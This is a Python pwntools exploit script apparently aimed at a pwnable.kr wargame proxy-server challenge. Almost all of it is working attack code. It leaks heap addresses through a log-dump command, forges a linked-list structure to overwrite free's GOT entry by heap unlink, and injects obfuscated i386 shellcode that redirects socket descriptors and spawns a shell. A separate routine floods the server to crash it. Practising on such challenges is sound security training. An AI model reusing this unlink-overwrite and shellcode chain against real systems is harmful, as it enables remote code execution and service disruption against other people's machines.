from pwn import *

from pwn import *

def dump_access_log(interact=False,strip_str="A"*120):
	p = remote("pwnable.kr",9903)
	cmd = "admincmd_proxy_dump_log"
	p.send(cmd)
	if interact:
		p.interactive()
	else:
		p.recvuntil("Dumping Logs......")
		p.recvuntil(strip_str)
		data = p.recv(8)
		heap1 = u32(data[:4])
		heap2 = u32(data[4:8])
		return heap1,heap2
		p.close()

def make_request(uri,interact=False):
	p = remote("pwnable.kr",9903)
	URI = "http://{}:80".format(uri)
	packet = "GET {}\r\n\r\n".format(URI)
	p.send(packet)
	sleep(0.1)
	if interact:
		p.interactive()
	else:
		p.close()


def test_aslr():
	malloc_got = 0x804A11C
	make_request("A"*120)
	H1,H2 = dump_access_log()
	print("HEAP LEAK(FD): %x"%H1)
	print("HEAP LEAK(BK): %x"%H2)

def shellcode_chk(shellcode):
	blacklist = ["/",":","\x00"," "]
	for x in blacklist:
		if x in shellcode:
			return False
	return True

def exploit():
	free_got = 0x804A16C
	
	'''
	ptr->next->prev = ptr->prev;
    ptr->prev->next = ptr->next;
	'''


	shellcode_addr = 0x28451250
	fake_struct = p32(shellcode_addr)+p32(free_got-0x80)
	fake_struct += shellcode
	fake_struct = fake_struct.ljust(120,"\x90")
	make_request(fake_struct)
	H1,H2 = dump_access_log(strip_str=fake_struct)

	assert(H1+16 == shellcode_addr) #assume ASLR is disabled

	fake_struct_addr = H1 + 8
	shellcode_addr = fake_struct_addr + 8
	log.info("fake_struct is located at 0x%x"%fake_struct_addr)
	log.info("shellcode is located at 0x%x"%shellcode_addr)
	for i in range(30):
		make_request("A"*120)


	#last log should be used for exploit
	make_request("B"*120+p32(0xdeadbeef)+p32(fake_struct_addr-0x80))
	make_request("A"*10,interact=True) #this will trigger the exploit


def shutdown():
	try:
		for i in range(32):
			make_request("A"*120+p32(0xdeadbeef)+p32(0xdeadbeef))
		dump_access_log()
	except:
		log.success("shut down proxy server")


if __name__ == "__main__":

	shellcode_d = '''
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	mov al,90
	mov bl,[ebp+8]
	mov cl,1
	push ecx
	push ebx
	push eax
	int 0x80
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	mov al,90
	mov bl,[ebp+8]
	push ecx
	push ebx
	push eax
	int 0x80
	xor eax,eax
	push eax
	push 2036481598
	pop ebp
	xor ebp,0x11111111
	push ebp
	push 2138600254
	pop ebp
	xor ebp,0x11111111
	push ebp
	mov ecx,esp
	push eax
	push esp
	push esp
	push ecx
	push eax
	mov al,0x3b
	int 0x80
	'''
	shellcode_d += shellcraft.i386.infloop()

	shellcode = asm(shellcode_d)

	assert shellcode_chk(shellcode)

	shutdown()
	log.progress("sleeping 3 seconds for proxy server to reboot...")
	sleep(3)
	exploit()
